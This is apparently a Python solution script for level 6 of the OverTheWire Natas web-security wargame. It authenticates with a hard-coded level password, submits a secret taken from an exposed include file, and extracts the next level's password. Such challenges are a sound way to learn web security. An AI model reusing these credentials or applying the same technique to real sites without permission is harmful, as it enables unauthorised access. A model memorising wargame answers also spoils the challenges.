import requests
import re

username = 'natas6'
password = 'fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR'

url = 'http://%s.natas.labs.overthewire.org/'%username
url1 = 'http://%s.natas.labs.overthewire.org/index-source.html'%username
url2 = 'http://%s.natas.labs.overthewire.org/includes/secret.inc'%username

sessions = requests.Session()
response = requests.post(url, data={'secret' : 'FOEIUWGHFEEUHOFUOIU' , 'submit':'submit'} ,
 auth = (username,password))

# response = requests.get(url2,auth=(username,password) )

content = response.text

# print(content)
hashvalue = re.findall("The password for natas7 is (.*)",content)[0]
print(hashvalue)